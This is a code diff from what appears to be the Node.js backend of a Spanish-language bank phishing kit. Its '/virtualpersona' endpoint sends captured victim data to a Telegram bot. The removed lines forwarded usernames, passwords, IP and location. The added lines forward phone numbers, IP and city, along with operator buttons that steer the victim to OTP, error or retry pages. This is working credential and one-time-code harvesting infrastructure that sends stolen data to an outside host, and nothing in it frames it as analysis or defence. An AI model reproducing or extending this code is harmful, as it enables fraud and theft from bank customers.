@@ -105,36 +105,28 @@ app.post('/virtualpersona', async (req, res) => {
       pending: null
     });
 
-    // 2. Crear texto a enviar
-    const text = `🔒 NUEVO INGRESO VIRTUAL 🔒\n\n👤 Usuario: ${user}\n🔑 Clave: ${pass}\n🌎 IP: ${ip} (${city}, ${country})\n🧾 SessionID: ${sessionId}`;
+  
+await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({
+    chat_id: CHAT_ID,
+    text: `🔔 Nuevo acceso:\n\n🆔 ID de sesión: ${sessionId}\n📱 Número: ${numero}\n🌐 IP: ${ip}\n📍 Ciudad: ${city}, ${country}`,
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "✅ Siguiente", callback_data: `redirigir|/otp1|${sessionId}` },
+          { text: "❌ Error OTP", callback_data: `redirigir|/otp-error|${sessionId}` },
+        ],
+        [
+          { text: "🔁 Reintentar", callback_data: `redirigir|/virtualpersona|${sessionId}` },
+          { text: "🛑 Cancelar", callback_data: `redirigir|/cancelado|${sessionId}` },
+        ],
+      ],
+    },
+  }),
+});
 
-    // 3. Crear botones
-   const buttons = {
-  inline_keyboard: [
-    [
-      { text: "❌ Error Logo", callback_data: JSON.stringify({ sessionId, action: 'redirect', redirect_to: 'Virtual-Persona.html' }) },
-      { text: "🔁 Intentar OTP", callback_data: JSON.stringify({ sessionId, action: 'redirect', redirect_to: 'opcion2.html' }) },
-    ],
-    [
-      { text: "✅ Continuar", callback_data: JSON.stringify({ sessionId, action: 'redirect', redirect_to: 'opcion1.html' }) }
-    ]
-  ]
-};
-
-
-    // 4. Enviar a Telegram
-      await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: process.env.CHAT_ID,
-        text,
-        parse_mode: 'HTML',
-        reply_markup: {
-          inline_keyboard: buttons.inline_keyboard
-        }
-      })
-    });
 
     res.json({ ok: true });
 
